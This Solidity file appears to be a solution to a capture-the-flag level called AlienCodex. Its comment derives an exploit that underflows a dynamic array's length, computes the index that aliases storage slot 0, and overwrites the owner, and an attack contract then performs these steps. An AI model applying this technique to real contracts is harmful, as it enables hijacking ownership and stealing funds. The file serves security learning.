// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**We have to claim ownership of the contract .
In the abi , the functions that seem to do that are :
transferOwnership .
The other functions that get inherited from ownable are : 
isOwner 
owner
renounceOwnership 
.

How can we claim ownership ? 
1. change the slot of the owner .
   can we change the slot of the owner by adding a content into the array ? 
 
------------------------------------------
codex is a bytes32 array . 
if you want to add elements :
you have to call record(content) , the bool contact should be true ( we should make contact)
retract() does codex.length-- . Which is suspicious 
possibilities :
 codex.length-- deletes the last elt on the array and retracts the length of the array by one .
 What if the array is empty ? and we trigger codex.length-- ?:
 then it won't find any elt to delete , and the lenght of the array would be -1 CONGRU 2^256 -1
 So that array will have the whole storage inside of it . 
If that happens , we can then revise( indexOfSlotOfOwner , myaddr ) And thus we claim ownership of the contract
where is the first elt in the array ? 
We first have to know the storage slot of the the array.
Let's suppose that Ownable has only one state variable , which is owner (20 bytes).
the second state variable is contact (1 byte).
These two first state variables will be stored in one slot (slot0)
And the second slot will hold the length of the array .
The first elt of the array will be stored in keccak256(abi.encode(1))

the equation is now : array[i] is slot0 . What is i ? 

let's make the problem a bit smaller 
Let's suppose that there are only 10 slots (from 0 to 9 ).
And let's assume that the first element of the array is stored at slot 0 .
Where will be slot0 index ?
slot0 | slot1 | slot2 | slot3 | slot4 | slot5 | slot6 | slot7 | slot8 | slot9 |   //storage layout
6     |     7 |     8 |     9 |     0 |     1 |     2 |      3|     4 |     5 |  //array

So slot0 is in the 6th element of the array .
6 = 9 - 4 + 1 
in the same way 
i = (2^256 -1) - uint(keccak256(abi.encode(1))) + 1
 */

interface AlienCodex  {

  function contact() external view  returns(bool);
  function codex(uint) external view returns(bytes32);
  function owner() external view returns (address);
  
  function makeContact() external ;
  function record(bytes32) external ;
  function retract()  external ;
  function revise(uint i , bytes32 _content)  external ; 
}

contract hack {
  AlienCodex target;
  constructor(address _address) {
    target = AlienCodex(_address);
  }


  function attack() public  {
    target.makeContact();
    target.retract();
    //storing the value 2^256-1
    uint max = type(uint).max ;
    uint i = max - uint(keccak256(abi.encode(1))) +1 ;
    target.revise(i, bytes32(uint(uint160(msg.sender))) );
    require(target.owner() == msg.sender) ;
  }
}s
